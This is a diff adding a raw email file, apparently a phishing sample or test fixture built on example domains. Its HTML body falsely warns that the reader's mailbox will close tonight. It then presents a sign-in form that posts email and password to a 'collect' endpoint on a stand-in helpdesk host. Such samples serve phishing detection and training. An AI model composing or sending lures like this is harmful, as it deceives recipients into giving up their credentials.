@@ -1,0 +1,19 @@
+Received: from helpdesk.example.net (helpdesk.example.net [203.0.113.99]) by mx.example.org; Thu, 05 Nov 2026 11:15:00 +0000
+From: Mailbox Administrator <admin@helpdesk.example.net>
+To: staff@example.com
+Subject: Mailbox quota exceeded - storage upgrade needed
+Date: Thu, 05 Nov 2026 11:14:20 +0000
+Message-ID: <20261105111420.4004@helpdesk.example.net>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body>
+<p>Dear user,</p>
+<p>Your mailbox has reached its limit and will be closed tonight.
+Sign in below to keep your messages.</p>
+<form action="http://helpdesk.example.net/collect" method="post">
+  <input type="text" name="email" placeholder="Email">
+  <input type="password" name="password" placeholder="Password">
+  <input type="submit" value="Keep my mailbox">
+</form>
+</body></html>
